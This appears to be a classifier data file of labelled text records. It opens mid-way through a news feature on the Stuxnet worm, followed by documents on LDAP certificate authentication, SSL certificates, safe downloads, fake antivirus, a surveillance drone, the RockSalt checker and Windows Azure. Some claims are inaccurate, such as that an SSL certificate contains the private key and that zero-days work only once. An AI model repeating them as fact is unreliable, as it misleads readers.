at Bushehr, Iran's nuclear power plant.\nAt Natanz, for almost 17 months, Stuxnet quietly worked its way into the system and targeted a specific component -- the frequency converters made by the German equipment manufacturer Siemens that regulated the speed of the spinning centrifuges used to create nuclear fuel. The worm then took control of the speed at which the centrifuges spun, making them turn so fast in a quick burst that they would be damaged but not destroyed. And at the same time, the worm masked that change in speed from being discovered at the centrifuges' control panel.\nAt Bushehr, meanwhile, a second secret set of codes, which Langner called “digital warheads,” targeted the Russian-built power plant's massive steam turbine.\nHere's how it worked, according to experts who have examined the worm:\n--The nuclear facility in Iran runs an “air gap” security system, meaning it has no connections to the Web, making it secure from outside penetration. Stuxnet was designed and sent into the area around Iran's Natanz nuclear power plant -- just how may never be known -- to infect a number of computers on the assumption that someone working in the plant would take work home on a flash drive, acquire the worm and then bring it back to the plant.\n--Once the worm was inside the plant, the next step was to get the computer system there to trust it and allow it into the system. That was accomplished because the worm contained a “digital certificate” stolen from JMicron, a large company in an industrial park in Taiwan. (When the worm was later discovered it quickly replaced the original digital certificate with another certificate, also stolen from another company, Realtek, a few doors down in the same industrial park in Taiwan.)\n--Once allowed entry, the worm contained four “Zero Day” elements in its first target, the Windows 7 operating system that controlled the overall operation of the plant. Zero Day elements are rare and extremely valuable vulnerabilities in a computer system that can be exploited only once. Two of the vulnerabilities were known, but the other two had never been discovered. Experts say no hacker would waste Zero Days in that manner.\n--After penetrating the Windows operating system, the code then targeted the siemens operating system that controlled the plant. Once that was in its grip it then took over the “frequency converters” that ran the centrifuges. To do that it used specifications from the manufacturers of the converters. One was Vacon, a Finnish Company, and the other Fararo Paya, an Iranian company. What surprises experts at this step is that the Iranian company was so secret that not even the IAEA knew about it.\n--The worm also knew that the complex control system that ran the centrifuges was built by Siemens, the German manufacturer, and -- remarkably -- how that system worked as well and how to mask its activities from it.\n--Masking itself from the plant's security and other systems, the worm then ordered the centrifuges to rotate extremely fast, and then to slow down precipitously. This damaged the converter, the centrifuges and the bearings, and it corrupted the uranium in the tubes. It also left Iranian nuclear engineers wondering what was wrong, as computer checks showed no malfunctions in the operating system.\nEstimates are that this went on for more than a year, leaving the Iranian program in chaos. And as it did, the worm grew and adapted throughout the system. As new worms entered the system, they would meet and adapt and become increasingly sophisticated.\nDuring this time the worms reported back to two mysterious servers that had to be run by intelligence agencies, one in Denmark and one in Malaysia. The servers monitored the worms as they infiltrated Natanz. Efforts to find those servers since then have yielded no results.\nThis went on until June of last year, when a Belarusan company working on the Iranian power plant in Beshehr discovered it in one of its machines. It quickly put out a notice on a Web network monitored by computer security experts around the world. Ordinarily these experts would immediately begin tracing the worm and dissecting it, looking for clues about its origin and other details.\nBut that didn’t happen, because within minutes all the alert sites came under attack and were inoperative for 24 hours.\n“I had to use e-mail to send notices but I couldn’t reach everyone. Whoever made the worm had a full day to eliminate all traces of the worm that might lead us them,” Eric Byres, a computer security expert who has examined the Stuxnet. “No hacker could have done that.”\nExperts, including inspectors from the International Atomic Energy Agency(IAEA,) say that, despite Iran's claims to the contrary, the worm was successful in its goal: causing confusion among Iran’s nuclear engineers and disabling their nuclear program.\nBecause of the secrecy surrounding the Iranian program, no one can be certain of the full extent of the damage. But sources inside Iran and elsewhere say that the Iranian centrifuge program has been operating far below its capacity and that the uranium enrichment program had “stagnated” during the time the worm penetrated the underground facility. Only 4,000 of the 9,000 centrifuges Iran was known to have were put into use. Some suspect that is because of the critical need to replace ones that were damaged.\nAnd the limited number of those in use dwindled to an estimated 3,700 as problems engulfed their operation. IAEA inspectors say the sabotage better explains the slowness of the program, which they had earlier attributed to poor equipment manufacturing and management problems. As Iranians struggled with the setbacks, they began searching for signs of sabotage. From inside Iran there have been unconfirmed reports that the head of the plant was fired shortly after the worm wended its way into the system and began creating technical problems, and that some scientists who were suspected of espionage disappeared or were executed. And counter intelligence agents began monitoring all communications between scientists at the site, creating a climate of fear and paranoia.\nIran has adamantly stated that its nuclear program has not been hit by the bug. But in doing so it has backhandedly confirmed that its nuclear facilities were compromised. When Hamid Alipour, head of the nation’s Information Technology Company, announced in September that 30,000 Iranian computers had been hit by the worm but the nuclear facilities were safe, he added that among those hit were the personal computers of the scientists at the nuclear facilities. Experts say that Natanz and Bushehr could not have escaped the worm if it was in their engineers’ computers.\n“We brought it into our lab to study it and even with precautions it spread everywhere at incredible speed,” Byres said.\n“The worm was designed not to destroy the plants but to make them ineffective. By changing the rotation speeds, the bearings quickly wear out and the equipment has to be replaced and repaired. The speed changes also impact the quality of the uranium processed in the centrifuges creating technical problems that make the plant ineffective,” he explained.\nIn other words the worm was designed to allow the Iranian program to continue but never succeed, and never to know why.\nOne additional impact that can be attributed to the worm, according to David Albright of the Institute for Science and International Studies, is that “the lives of the scientists working in the facility have become a living hell because of counter-intelligence agents brought into the plant” to battle the breach. Ironically, even after its discovery, the worm has succeeded in slowing down Iran's reputed effort to build an atomic weapon. And Langer says that the efforts by the Iranians to cleanse Stuxnet from their system “will probably take another year to complete,” and during that time the plant will not be able to function anywhere normally.\nBut as the extent of the worm’s capabilities is being understood, its genius and complexity has created another perplexing question: Who did it?\nSpeculation on the worm’s origin initially focused on hackers or even companies trying to disrupt competitors. But as engineers tore apart the virus they learned not only the depth of the code, its complex targeting mechanism, (despite infecting more than 100,000 computers it has only done damage at Natanz,) the enormous amount of work that went into it—Microsoft estimated that it consumed 10,000 man days of labor-- and about what the worm knew, the clues narrowed the number of players that have the capabilities to create it to a handful.\n“This is what nation-states build, if their only other option would be to go to war,” Joseph Wouk, an Israeli security expert wrote.\nByres is more certain. “It is a military weapon,” he said.\nAnd much of what the worm “knew” could only have come from a consortium of Western intelligence agencies, experts who have examined the code now believe.\nOriginally, all eyes turned toward Israel’s intelligence agencies. Engineers examining the worm found “clues” that hinted at Israel’s involvement. In one case they found the word “Myrtus” embedded in the code and argued that it was a reference to Esther, the biblical figure who saved the ancient Jewish state from the Persians. But computer experts say \"Myrtus\" is more likely a common reference to “My RTUS,” or remote terminal units.\nLanger argues that no single Western intelligence agency had the skills to pull this off alone. The most likely answer, he says, is that a consortium of intelligence agencies worked together to build the cyber bomb. And he says the most likely confederates are the United States, because it has the technical skills to make the virus, Germany, because reverse-engineering Siemen’s product would have taken years without it, and Russia, because of its familiarity with both the Iranian nuclear plant and Siemen’s systems.\nThere is one clue that was left in the code that may tell us all we need to know.\nEmbedded in different section of the code is another common computer language reference, but this one is misspelled. Instead of saying “DEADFOOT,” a term stolen from pilots meaning a failed engine, this one reads “DEADFOO7.”\nYes, OO7 has returned -- as a computer worm.\nStuxnet. Shaken, not stirred.", "label": 1}
{"text": "Certificate-based authentication over an SSL connection is the most secure type of authentication. Therefore, when authentication occurs at the connection layer, the client does not need to provide an additional name (bind DN) and password to Directory Proxy Server during the LDAP bind.\nA client can only perform certificate-based authentication over an SSL connection. The basic steps in establishing an SSL connection are as follows:\nThe client requests that a secure connection be established.\nAs part of this request, Directory Proxy Server provides a server certificate to the client. A server certificate is a single certificate associated with one instance of Directory Proxy Server. When a secure connection is used, the server certificate identifies the instance of Directory Proxy Server to the client.\nThe establishment of the connection includes a negotiation phase. During this phase, the client and Directory Proxy Server attempt to agree on the encryption policy that is used. The server certificate contains the list of encryption policies (ciphers) that are supported by the Directory Proxy Server.\nDepending on the security configuration of the proxy server, the server might require the client to provide a certificate.\nThe client provides a certificate to the server, either because the client is configured to do so, or because the proxy server has requested it.\nThe client then sends an LDAP bind request to Directory Proxy Server to establish the client's identity on that connection.\nIf the request is a simple bind, Directory Proxy Server uses the bind DN and password provided by the client.\nIf the request is a SASL external bind, Directory Proxy Server does one of two things:\nConsiders the subject of the certificate as the bind DN of the client.\nMaps the certificate by searching the backend server for an entry that matches the received certificate. If the verify-certs property is set, Directory Proxy Server verifies that the received certificate is the one stored in the entry that is found.\nThe following configuration properties determine how Directory Proxy Server performs that search:\ncert-data-view-routing-policy cert-data-view-routing-custom-list cert-search-bind-dn cert-search-bind-pwd-file cert-search-base-dn cert-search-attr-mappings\nWhen the proxy server has the bind DN, it can verify the validity of the client.\nFor more information about SSL for Directory Proxy Server, see Secure Sockets Layer for Directory Proxy Server.\nFor certificate-based authentication to occur, Directory Proxy Server must be configured to accept client certificates and the client must be configured to use SASL external bind.\nWhen you create a Directory Proxy Server instance, the certificate database is automatically populated with the CA certificates of certain trusted CAs. You can add trusted CA certificates to the certificate database if necessary, by using the Directory Service Control Center (DSCC) or by using the dpadm command. For more information, see To Install a CA-Signed Server Certificate for Directory Proxy Server in Oracle Fusion Middleware Administration Guide for Oracle Directory Server Enterprise Edition.\nWhen a client provides a certificate to Directory Proxy Server, the server verifies that certificate against the list of trusted CA certificates in its certificate database. The verification is successful if the server's certificate database contains the client certificate itself, or the CA certificate with which the client certificate was generated.\nThe server certificate can be one of the following:\nSelf-signed certificate. A public and private key pair, where the public key is signed by Directory Proxy Server.\nTrusted CA certificate. A single certificate that is automatically generated by the company’s internal certificate server or by a known Certificate Authority (CA).\nDirectory Proxy Server also supports the use of a server certificate chain. A server certificate chain is a collection of certificates that are automatically generated by the company’s internal certificate server or by a known CA. The certificates in a chain trace back to the original CA, providing proof of identity. This proof is required each time you obtain or install a new server certificate.\nWhen an instance of Directory Proxy Server is created, a default self-signed certificate is created. By default, Directory Proxy Server manages the SSL certificate database password internally.\nYou can install any number of certificates on a server. When you configure SSL for an instance of Directory Proxy Server, you must install at least one server certificate and one trusted CA certificate.\nFor an explanation of how certificate-based authentication works, see Certificate-Based Authentication. For information about how to configure certificate-based authentication for Directory Proxy Server, see To Configure Certificate-based Authentication in Oracle Fusion Middleware Administration Guide for Oracle Directory Server Enterprise Edition.\nWhen a client binds to Directory Proxy Server with the Simple Authentication and Security Layer (SASL) external bind, Directory Proxy Server obtains the credentials of the client from the certificate, rather than from the bind DN.\nThe server obtains the credentials in one of two ways:\nConsiders the subject of the certificate as the bind DN of the client\nMaps the certificate subject to data within its own database, to deduce the bind DN\nSASL external bind cannot be used if Directory Proxy Server is configured for BIND replay. In BIND replay, Directory Proxy Server authenticates the client to a backend LDAP server by using the client DN and password. In SASL external bind, no password is provided by the client. Furthermore, the password that is stored in the user entry cannot be read in clear text. For information about bind replay, see Directory Proxy Server Configured for BIND Replay.\nSSL can be used to protect subsequent interactions between the client and Directory Proxy Server.\nFor information about how to configure authentication by SASL external bind, see To Configure Directory Proxy Server for SASL External Bind in Oracle Fusion Middleware Administration Guide for Oracle Directory Server Enterprise Edition.", "label": 1}
{"text": "What is an SSL certificate?\nThe Secure Sockets Layer (SSL) protects data transferred over http using\nencryption enabled by a servers SSL Certificate.\nAn SSL Certificate is an electronic file that uniquely identifies\nindividuals and Web sites and enables encrypted communications.\nAn SSL Certificate contains a public key and a private key. A public key is\nused to encrypt information and a private key is used to decipher it. When a\nbrowser points to a secured domain, an SSL handshake authenticates the\nserver and the client and establishes an encryption method and a unique\nsession key. They can begin a secure session that guarantees message privacy\nand message integrity.\nSSL Certificates serve as a kind of digital Passport or credential.\nTypically, the \"signer\" of a certificate is a \"Certificate\nAuthority\" (CA), such as VeriSign.\nEncryption, the process of transforming information to make it\nunintelligible to all but the intended recipient, forms the basis of data\nintegrity and privacy necessary for e-commerce. Customers submit sensitive\ninformation and purchase goods or services via the Web only when they are\nconfident that their personal information is secure.\nThe solution for businesses that are serious about online transactions is\nto implement a trust infrastructure based on encryption technology.\nThe diagram below illustrates the process that guarantees protected\ncommunications between a Web server and a client. All exchanges of SSL\nCertificates occur within seconds, and require no action by the consumer.", "label": 1}
{"text": "Virus-infested files are capable of causing many different problems for computer users, making it essential to verify that downloads are safe before allowing them to access the system. There are a multitude of different tools available for computer users to help keep valuable machines protected against these malicious threats. Use one of the following methods to make certain a virus is not allowed to attack your computer system.\n1. Use an Antivirus Package\nMany of the most popular antivirus tools allow specific files to be checked for potential corruptions. This is a valuable resource for computer users who fear a potential virus or malware infection. Simply download a file from the Internet and use the built-in antivirus scanner to check for problems. This will provide peace of mind in launching the file in question.\n2. Rely on a Firewall\nFirewalls are additional security tools that are programmed to look for suspicious files and keep the user aware of any problems as they arise. These are particularly valuable tools when computer users are visiting sites that may try to download payloads of malware without the user’s knowledge. Firewalls are also valuable when a file is consciously downloaded, as they will look for any problems within such downloads.\n3. Use an Online Scanner\nInstead of downloading a file that could potentially wreak havoc on the computer, some users turn to online scanners. These scanners do not require a download to the system itself, but simply ask for the URL of the file that is suspected of being infected. The server will download the file in question and peruse the content for any infections. This is an incredibly safe way of looking for viruses, and will not unnecessarily expose the machine to potential problems.\n4. Find a Download Manager\nSophisticated download managers have been created for users who need a way to easily look for files that may be unsafe. In addition to making downloads easier to manage, powerful download managers can scan files for potential issues, alerting the computer user of the presence of any unwanted infections before the file is launched on the machine.\n5. Set Download Preferences\nMany computer users are surprised to discover they can control what downloads are allowed to launch on their machine. Default file settings should be modified to ensure that files and applications are only allowed to run after they have been given explicit permission by the computer user. These settings can be changed within the control panel, and will allow users to stay on the lookout for nefarious files that could otherwise launch without their knowledge of the issue.\nKeeping a machine running without infections is a serious responsibility that is heaped on the shoulders of any computer owner. By understanding the different protection methods available, computer users can help to ensure they remain protected whenever using the Internet to download files. It is also important to use common sense when using files from the web, making certain content only comes from trusted sources and researching applications before installing them on the machine.", "label": 1}
{"text": "Fake antivirus--false pop-up warnings designed to scare money out of computer users--represents 15 percent of all malware that Google detects on Web sites, according to 13-month analysis the company conducted between January 2009 and February 2010.\nThat's a five-fold increase from when the company first started its analysis, Niels Provos, a principal software engineer at Google, said in an interview.\nMeanwhile, fake antivirus scams represent half of all malware delivered via advertisements, which is becoming a problem for high-profile sites that rely on their advertisers and ad networks to distribute clean ads.\nGoogle analyzed 240 million Web pages and uncovered more than 11,000 domains involved in fake antivirus distribution for the study, which Google is set to unveil at the Usenix Workshop on Large-Scale Exploits and Emergent Threats Tuesday in San Jose, Calif.\nFor more on this story, read Google: Fake antivirus is 15 percent of all malware on CNET News.", "label": 1}
{"text": "Imagine a cheap, tiny, hovering aerial drone capable of being launched with the flick of a person’s wrist and able to provide manipulable 360-degree surveillance views.\nIt’s real, it’s inspired by maple seeds, and the company behind it, Lockheed Martin, envisions a future in which swarms of the new drones can be deployed at a fraction of the cost and with greater capabilities than drones being used today by the military and other agencies.\n“Think about dropping a thousand of these out of an aircraft,” said Bill Borgia, head of Lockheed Martin’s Intelligent Robotics Lab, in a phone interview with TPM, “Think about the wide area over which one collect imagery. Instead of sending one or two expensive, highly valuable aircraft like we do today, you could send thousands of these inexpensive aircraft, and they are almost expendable.”\nThe new drone which looks like very similar to a maple seed, with a small pod-like body attached a single whirring blade, is called the Samarai. The name is derived from the Latin word “samara,” which means a winged seed, just like the one that inspired its physical design, flight pattern and construction.\nIn June, Lockheed Martin released a video demo of the drone’s capabilities, and it is clearly impressive, launched by hand and piloted using a tablet computer, which also displays the drone’s live surveillance feed.\n“You can literally pull this out of your pocket, throw it into the air, and it can start flying,” Borgia told TPM. “It can take off and land vertically indoors.”\nBorgia said that the drone, or unmanned aerial vehicle (UAV), was designed to be deployed in confined settings, such as urban environments or even inside buildings, where it could be piloted into different rooms and hover outside of windows, collecting surveillance footage with ease.\nThe technology behind the drone is even more sophisticated than it looks. There are only two moving mechanical parts in the entire tiny 30-cm aircraft: The piece that makes the propeller rotate and a flap on the large wing that comprises most of the drone’s form.\nThen there’s the Samarai’s realtime video feed, which an operator can pan and tilt in a full 360 degrees, a capability not found on any other drone of its class, this despite the fact that the drone only contains one camera which is constantly being whipped around by the rotating motion of the aircraft itself.\nIn order to obtain a steady video feed with the ability to virtually pan and tilt, Lockheed relies on a series of image processing algorithms, Borgia told TPM.\n“The algorithms sort of de-rotate the video and turn it back into a frame-by-frame view, similar to what you would see on any basic TV,” Borgia said. “All of the image processing is done onboard.”\nThat means that even if disconnected from the cloud or a control server, the Samarai would still be able to provide its operators with constant surveillance capabilities.\nBorgia declined to specify the drone’s range or endurance, that is, the time it’s able to stay aloft in the air.\nHowever, he did note that the Lockheed researchers behind Samarai had experimented with battery-powered and carbon-based fuel versions (the battery powered version is the one demonstrated in the video). Borgia further said that the researchers had “developed simulation tools that allow us to scale the vehicle to meet specific applications,” asked for by customers.\nLockheed Martin has not revealed any of its customers or potential partners on the Samarai yet, but Borgia said the company would make announcements “when the customers were ready.”\nBesides the 30-cm version shown in the June demo video, Lockheed also has field-tested a 17-cm version and is working now to scale down the Samarai even further, to the size of an actual maple seed.\nAsked about any potential privacy concerns presented by the Samarai, especially in light of the recent release of a voluntary industry “code of conduct” from drone manufacturers, Borgia said that “customers will have to work through the hurdles.”\nLockheed Martin began work on the Samarai in 2007 under a Defense Department program called “nano air,” designed to produce “an extremely small, ultra lightweight air vehicle system.”", "label": 1}
{"text": "July 20, 2012 A team led by Harvard computer scientists, including two undergraduate students, has developed a new tool that could lead to increased security and enhanced performance for commonly used web and mobile applications.\nCalled RockSalt, the clever bit of code can verify that native computer programming languages comply with a particular security policy.\nPresented at the ACM Conference on Programming Language Design and Implementation (PLDI) in Beijing, in June, RockSalt was created by Greg Morrisett, Allen B. Cutting Professor of Computer Science at the Harvard School of Engineering and Applied Sciences (SEAS), two of his undergraduate students Edward Gan '13 and Joseph Tassarotti '13, former postdoctoral fellow Jean-Baptiste Tristan (now at Oracle), and Gang Tan of Lehigh University.\nThe use of native code, especially in an online environment, however, opens up the door to hackers who can exploit vulnerabilities and readily gain access to other parts of a computer or device. An initial solution to this problem was offered over a decade ago by computer scientists at the University of California, Berkeley, who developed software fault isolation (SFI).\nSFI forces native code to \"behave\" by rewriting machine code to limit itself to functions that fall within particular parameters. This \"sandbox process\" sets up a contained environment for running native code. A separate \"checker\" program can then ensure that the executable code adheres to regulations before running the program.\nWhile considered a major breakthrough, the solution was limited to devices using RISC chips, a processor more common in research than in consumer computing. In 2006, Morrisett developed a way to implement SFI on the more popular CISC-based chips, like the Intel x86 processor. The technique was adopted widely. Google modified the routine for Google Chrome, eventually developing it into Google Native Client (or \"NaCl\").\nWhen bugs and vulnerabilities were found in the checker for NaCl, Google sent out a call to arms. Morrissett once again took on the challenge, turning the problem into an opportunity for his students. The result was RockSalt, an improvement over NaCl, built using Coq, a proof development system.\n\"We built a simple but incredibly powerful system for proving a hypothesis -- so powerful that it's likely to be overlooked. We want to prove that if the checker says 'yes,' the code will indeed respect the sandbox security policy,\" says Joseph Tassarotti '13, who built and tested a model of the execution of x86 instructions. \"We wanted to get a guarantee that there are no bugs in the checker, so we set out to construct a rigorous, machine-checked proof that the checker is correct.\"\n\"Our proofs about the correctness of our own tool say that if you run the tool on a program, and it says it's safe to run, then according to the model, this program can only do certain things,\" Tassarotti adds. \"Our proof, however, was only as good as this model. If the model was wrong, then the tool could potentially have an error.\"\nIn other words, he explains, think of an analogy in physics. While you might mathematically prove that according to Newton's laws, a moving object will follow a certain trajectory, the proof is only meaningful to the degree that Newton's laws accurately model the world.\n\"Since the x86 architecture is very complicated, it was essential to test the model by running programs on a real chip, then simulating them with the model, and seeing whether the results matched. I specified the meanings of many of these instructions and developed the testing infrastructure to check for errors in the model,\" Tassarotti says.\n\"The biggest benefit may be that users can have more peace of mind that a piece of software works as they want it to,\" says Morrisett. \"For users, the impact of such a tool is slightly more tangible; it allows users to safely run, for example, games, in a web browser without the painfully slow speeds that translated code traditionally provides.\"\nPrevious efforts to develop a robust, error-free checker have resulted in some success, but RockSalt has the potential to be scaled to software widely used by the general public. The researchers expect that their tool might end up being adopted and integrated into future versions of common web browsers. Morrisett and his team also have plans to adapt the tool for use in a broader variety of processors.\nReflecting on how the class project has been transformative, Tassarotti says, \"I plan to pursue a Ph.D. in computer science, and I hope to work on projects like this that can improve the correctness of software. As computers are so prevalent now in fields like avionics and medical devices, I believe that this type of research is essential to ensure safety.\"\nOther social bookmarking and sharing tools:\nNote: If no author is given, the source is cited instead.", "label": 1}
{"text": "Introducing Windows Azure\nWindows Azure is Microsoft's application platform for the public cloud. You can use this platform in many different ways. For instance, you can use Windows Azure to build a web application that runs and stores its data in Microsoft datacenters. You can use Windows Azure just to store data, with the applications that use this data running on-premises (that is, outside the public cloud). You can use Windows Azure to create virtual machines for development and test or to run SharePoint and other applications. You can use Windows Azure to build massively scalable applications with lots and lots of users. Because the platform offers a wide range of services, all of these things-and more-are possible.\nTo do any of them, though, you need to understand the basics. Even if you don't know anything about cloud computing, this article will walk you through the fundamentals of Windows Azure. The goal is to give you a foundation for understanding and using this cloud platform.\nTable of Contents\nThe Components of Windows Azure\nTo understand what Windows Azure offers, it's useful to group its services into distinct categories. Figure 1 shows one way to do this.\nFigure 1: Windows Azure provides Internet-accessible application services running in Microsoft datacenters.\nTo get started with Windows Azure, you need to know at least the basics about each of its components.You can also use the What Is Windows Azure Poster for a quick, visual way to get an overview. The colors of the boxes in Figure 1 correspond to their grouping on the poster.\nThe rest of this article walks through the technologies shown in the figure, describing what each one offers and when you might use it.\nOne of the most basic things a cloud platform does is execute applications. Windows Azure provides three options for doing this, as Figure 2 shows.\nFigure 2: Windows Azure provides Infrastructure as a Service (IaaS), web hosting, and Platform as a Service (PaaS).\nEach of these three approaches-Virtual Machines, Web Sites, and Cloud Services-can be used separately. You can also combine them to create an application that uses two or more of these options together.\nThe ability to create a virtual machine on demand, whether from a standard image or from one you supply, can be very useful. Add the ability to pay for this VM by the hour, and it's even more useful. This approach, commonly known as Infrastructure as a Service (IaaS), is what Windows Azure Virtual Machines provides.\nTo create a VM, you specify which VHD to use and the VM's size. You then pay for each hour the VM is running. As Figure 2 shows, Windows Azure Virtual Machines offers a gallery of standard VHDs. These include Microsoft-provided options, such as Windows Server 2008 R2, Windows Server 2012, and Windows Server 2008 R2 with SQL Server, along with Linux images provided by Microsoft partners. You're free to upload and create VMs from your own VHDs as well.\nWherever the image comes from, you can persistently store any changes made while a VM is running. The next time you create a VM from that VHD, things pick up where you left off. It's also possible to copy the changed VHD out of Windows Azure, then run it locally.\nWindows Azure VMs can be used in many different ways. You might use them to create an inexpensive development and test platform that you can shut down when you've finished using it. You might also create and run applications that use whatever languages and libraries you like. Those applications can use any of the data management options that Windows Azure provides, and you can also choose to use SQL Server or another DBMS running in one or more virtual machines. Another option is to use Windows Azure VMs as an extension of your on-premises datacenter, running SharePoint or other applications. To support this, it's possible to create Windows domains in the cloud by running Active Directory in Windows Azure VMs. This quite general approach to cloud computing can be used to address many different problems. What you do is up to you.\nOne of the most common things that people do in the cloud is run web sites and web applications. Windows Azure Virtual Machines allows this, but it still leaves you with the responsibility of administering one or more VMs. What if you just want a web site where somebody else takes care of the administrative work for you?\nThis is exactly what Windows Azure Web Sites provides. This execution model offers a managed web environment using the Windows Azure Management portal. You can move an existing web site into Windows Azure Web Sites unchanged, or you can create a new one directly in the cloud. Once a web site is running, you can add or remove instances dynamically, relying on Windows Azure Web Sites to load balance requests across them. Windows Azure Web Sites offers both a shared option, where your web site runs in a virtual machine with other sites, and a reserved option that allows a site to run in its own VM. The reserved option also lets you increase the size (computing power) of your instances if needed.\nWindows Azure Web Sites is intended to be useful for both developers and web design agencies. For development, it supports .NET, PHP, and Node.js, along with SQL Database and (from ClearDB, a Microsoft partner) MySQL for relational storage. It also provides built-in support for several popular applications, including WordPress, Joomla, and Drupal. The goal is to provide a low-cost, scalable, and broadly useful platform for creating web sites and web applications in the public cloud.\nSuppose you want to build a cloud application that can support lots of simultaneous users, doesn't require much administration, and never goes down. You might be an established software vendor, for example, that's decided to embrace Software as a Service (SaaS) by building a version of one of your applications in the cloud. Or you might be a start-up creating a consumer application that you expect will grow fast. If you're building on Windows Azure, which execution model should you use?\nWindows Azure Web Sites allows creating this kind of web application, but there are some constraints. You don't have administrative access, for example, which means that you can't install arbitrary software. Windows Azure Virtual Machines gives you lots of flexibility, including administrative access, and you certainly can use it to build a very scalable application, but you'll have to handle many aspects of reliability and administration yourself. What you'd like is an option that gives you the control you need but also handles most of the work required for reliability and administration.\nThis is exactly what's provided by Windows Azure Cloud Services. This technology is designed expressly to support scalable, reliable, and low-admin applications, and it's an example of what's commonly called Platform as a Service (PaaS). To use it, you create an application using the technology you choose, such as C#, Java, PHP, Python, Node.js, or something else. Your code then executes in virtual machines (referred to as instances) running a version of Windows Server.\nBut these VMs are distinct from the ones you create with Windows Azure Virtual Machines. For one thing, Windows Azure itself manages them, doing things like installing operating system patches and automatically rolling out new patched images. (This implies that your application shouldn't maintain state in web or worker role instances; it should instead be kept in one of the Windows Azure data management options described in the next section.) Windows Azure also monitors the VMs, restarting any that fail.\nAs Figure 2 shows, you have two roles to choose from when you create an instance, both based on Windows Server. The main difference between the two is that an instance of a web role runs IIS, while an instance of a worker role does not. Both are managed in the same way, however, and it's common for an application to use both. For example, a web role instance might accept requests from users, then pass them to a worker role instance for processing. To scale your application up or down, you can request that Windows Azure create more instances of either role or shut down existing instances. And just like Windows Azure Virtual Machines, you're charged by the hour for each web or worker role instance.\nEach of the three Windows Azure execution models has its own role to play. Windows Azure Virtual Machines provides a general-purpose computing environment, Windows Azure Web Sites offers low-cost web hosting, and Windows Azure Cloud Services is the best choice for creating scalable, reliable applications with low administration costs. And as mentioned earlier, you can use these technologies separately or combine them as needed to create the right foundation for your application. The approach you choose depends on what problems you're trying to solve.\nApplications need data, and different kinds of applications need different kinds of data. Because of this, Windows Azure provides several different ways to store and manage data.\nOne of these has already been mentioned: the ability to run SQL Server or another DBMS in a VM created with Windows Azure Virtual Machines. (It's important to realize that this option isn't limited to relational systems; you're also free to run NoSQL technologies such as MongoDB and Cassandra.) Running your own database system is straightforward-it replicates what we're used to in our own datacenters-but it also requires handling the administration of that DBMS. To make life easier, Windows Azure provides three data management options that are largely managed for you. Figure 3 shows the choices.\nFigure 3: For data management, Windows Azure provides relational storage, scalable NoSQL tables, and unstructured binary storage.\nEach of the three options addresses a different need: relational storage, fast access to potentially large amounts of simple typed data, and unstructured binary storage. In all three cases, data is automatically replicated across three different computers in a Windows Azure datacenter to provide high availability. It's also worth pointing out that all three options can be accessed either by Windows Azure applications or by applications running elsewhere, such as your on-premises datacenter, your laptop, or your phone. And however you apply them, you pay for all Windows Azure data management services based on usage, including a gigabyte-per-month charge for stored data.\nFor relational storage, Windows Azure provides SQL Database. Formerly called SQL Azure, SQL Database provides all of the key features of a relational database management system, including atomic transactions, concurrent data access by multiple users with data integrity, ANSI SQL queries, and a familiar programming model. Like SQL Server, SQL Database can be accessed using Entity Framework, ADO.NET, JDBC, and other familiar data access technologies. It also supports most of the T-SQL language, along with SQL Server tools such as SQL Server Management Studio. For anybody familiar with SQL Server (or another relational database), using SQL Database is straightforward.\nBut SQL Database isn't just a DBMS in the cloud-it's a PaaS service. You still control your data and who can access it, but SQL Database takes care of the administrative grunt work, such as managing the hardware infrastructure and automatically keeping the database and operating system software up to date. SQL Database also provides a federation option that distributes data across multiple servers. This is useful for applications that work with large amounts of data or need to spread data access requests across multiple servers for better performance.\nIf you're creating a Windows Azure application (using any of the three execution models) that needs relational storage, SQL Database can be a good option. Applications running outside the cloud can also use this service, though, so there are plenty of other scenarios. For instance, data stored in SQL Database can be accessed from different client systems, including desktops, laptops, tablets, and phones. And because it provides built-in high availability through replication, using SQL Database can help minimize downtime.\nSuppose you want to create a Windows Azure application that needs fast access to typed data, maybe lots of it, but doesn't need to perform complex SQL queries on this data. For example, imagine you're creating a consumer application that needs to store customer profile information for each user. Your app is going to be very popular, so you need to allow for lots of data, but you won't do much with this data beyond storing it, then retrieving it in simple ways. This is exactly the kind of scenario where Windows Azure Tables makes sense.\nDon't be confused by the name: this technology doesn't provide relational storage. (In fact, it's an example of a NoSQL approach called a key/value store.) Instead, Windows Azure Tables let an application store properties of various types, such as strings, integers, and dates. An application can then retrieve a group of properties by providing a unique key for that group. While complex operations like joins aren't supported, tables offer fast access to typed data. They're also very scalable, with a single table able to hold as much as a terabyte of data. And matching their simplicity, tables are usually less expensive to use than SQL Database's relational storage.\nThe third option for data management, Windows Azure Blobs, is designed to store unstructured binary data. Like Tables, Blobs provides inexpensive storage, and a single blob can be as large as one terabyte. An application that stores video, for example, or backup data or other binary information can use blobs for simple, cheap storage. Windows Azure applications can also use Windows Azure drives, which let blobs provide persistent storage for a Windows file system mounted in a Windows Azure instance. The application sees ordinary Windows files, but the contents are actually stored in a blob.\nWindows Azure runs today in several datacenters spread across the United States, Europe, and Asia. When you run an application or store data, you can select one or more of these datacenters to use. You can also connect to these datacenters in various ways:\nYou can use Windows Azure Virtual Network to connect your own on-premises local network to a defined set of Windows Azure VMs.\nIf your Windows Azure application is running in multiple datacenters, you can use Windows Azure Traffic Manager to route requests from users intelligently across instances of the application.\nFigure 4 illustrates these options.\nFigure 4: Windows Azure allows creating a cloud VPN, and intelligently distributing user requests across different datacenters.\nOne useful way to use a public cloud is to treat it as an extension of your own datacenter. Because you can create VMs on demand, then remove them (and stop paying) when they're no longer needed, you can have computing power only when you want it. And since Windows Azure Virtual Machines lets you can create VMs running SharePoint, Active Directory, and other familiar on-premises software, this approach can work with the applications you already have.\nTo make this really useful, though, your users ought to be able to treat these applications as if they were running in your own datacenter. This is exactly what Windows Azure Virtual Network allows. Using a VPN gateway device, an administrator can set up a virtual private network (VPN) between your local network and a defined group of VMs running in Windows Azure. Because you assign your own IP v4 addresses to the cloud VMs, they appear to be on your own network. Users in your organization can access the applications those VMs contain as if they were running locally.\nA Windows Azure application with users in just a single part of the world might run in only one Windows Azure datacenter. An application with users scattered around the world, however, is more likely to run in multiple datacenters, maybe even all of them. In this second situation, you face a problem: How do you intelligently assign users to application instances? Most of the time, you probably want each user to access the datacenter closest to her, since it will likely give her the best response time. But what if that copy of the application is overloaded or unavailable? In this case, it would be nice to route her request automatically to another datacenter. This is exactly what's done by Windows Azure Traffic Manager.\nThe owner of an application defines rules that specify how requests from users should be routed to datacenters, then relies on Traffic Manager to carry out these rules. For example, users might normally be routed to the closest Windows 